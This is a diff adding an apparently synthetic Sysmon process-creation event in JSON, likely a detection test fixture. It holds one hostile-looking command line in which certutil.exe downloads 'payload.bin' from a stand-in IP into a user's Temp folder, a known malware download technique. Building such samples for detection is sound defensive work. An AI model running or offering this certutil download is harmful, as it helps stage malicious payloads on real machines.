@@ -1,0 +1,8 @@
+{
+  "_label": "SYNTHETIC — not a real host event",
+  "TimeGenerated": "2026-07-02T09:10:44Z",
+  "Computer": "PC-01",
+  "Source": "Microsoft-Windows-Sysmon",
+  "EventID": 1,
+  "EventData": "<Data Name=\"Image\">C:\\Windows\\System32\\certutil.exe</Data><Data Name=\"CommandLine\">certutil.exe -urlcache -split -f https://192.0.2.10/payload.bin C:\\Users\\user01\\AppData\\Local\\Temp\\payload.bin</Data><Data Name=\"User\">CONTOSO\\user01</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"ProcessGuid\">{00000000-0000-4000-8000-000000000002}</Data>"
+}
